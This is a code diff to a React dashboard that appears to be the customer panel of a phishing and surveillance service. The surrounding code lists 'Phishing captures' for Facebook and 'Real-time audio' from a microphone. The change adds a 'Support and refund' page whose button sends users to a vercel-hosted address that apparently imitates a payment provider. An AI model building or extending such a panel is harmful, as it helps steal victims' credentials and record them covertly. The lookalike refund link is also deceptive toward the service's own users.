@@ -706,6 +706,7 @@ export default function Dashboard({ email }) {
     { label: 'Instagram', icon: <FaInstagram size={44} color="#E1306C" />, desc: 'Coming soon...' },
     { label: 'Facebook', icon: <FaFacebookF size={44} color="#1877f3" />, desc: 'Phishing captures' },
     { label: 'Microphone', icon: <FaMicrophone size={44} color="#fff" />, desc: 'Real-time audio' },
+    { label: 'Support and refund', icon: <FaHome size={44} color="#E60033" />, desc: 'Help and refunds' },
   ];
 
   // Itens da sidebar (inclui Home)
@@ -843,6 +844,35 @@ export default function Dashboard({ email }) {
               <h2 style={{ color: '#E1306C', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Instagram</h2>
               <b style={{ marginTop: 16 }}>Instagram coming soon...</b>
           </div>
+          )}
+          {active === 'Support and refund' && (
+            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+              <h2 style={{ color: '#E60033', fontWeight: 700, fontSize: 24, margin: '10px 0 24px 0', textAlign: 'center' }}>Support and refund</h2>
+              <p style={{ color: '#b0b0b0', fontSize: 17, textAlign: 'center', maxWidth: 480, margin: '0 auto 2rem auto' }}>
+                If you need help or want to request a refund, please use the support form or the refund button below.
+              </p>
+              <button
+                style={{
+                  marginTop: 8,
+                  background: '#1a73e8',
+                  color: '#fff',
+                  border: 'none',
+                  borderRadius: 8,
+                  padding: '0.7rem 1.7rem',
+                  fontSize: '1rem',
+                  fontWeight: 700,
+                  cursor: 'pointer',
+                  width: '100%',
+                  maxWidth: 300,
+                  display: 'block',
+                  marginLeft: 'auto',
+                  marginRight: 'auto',
+                }}
+                onClick={() => window.location.href = 'https://app-perfectpay-combr.vercel.app/'}
+              >
+                Request a refund
+              </button>
+            </div>
           )}
         </div>
       </div>
